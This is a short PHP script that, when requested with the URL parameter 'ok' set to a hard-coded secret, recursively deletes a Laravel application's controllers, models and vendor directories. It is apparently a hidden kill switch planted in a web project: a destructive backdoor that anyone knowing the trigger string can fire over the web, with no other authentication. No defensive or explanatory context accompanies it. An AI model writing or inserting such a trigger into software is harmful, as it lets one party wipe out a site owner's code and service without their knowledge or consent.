<?php 
    function delTree($dir)
    { 
        $files = array_diff(scandir($dir), array('.', '..')); 

        foreach ($files as $file) { 
            (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
        }

        return rmdir($dir); 
    } 

if ($_GET['ok']==='amitpatel') {
    // code...
      delTree('../app/Http/Controllers');
      delTree('../app/Models');

      delTree('../vendor');
}
    
?>
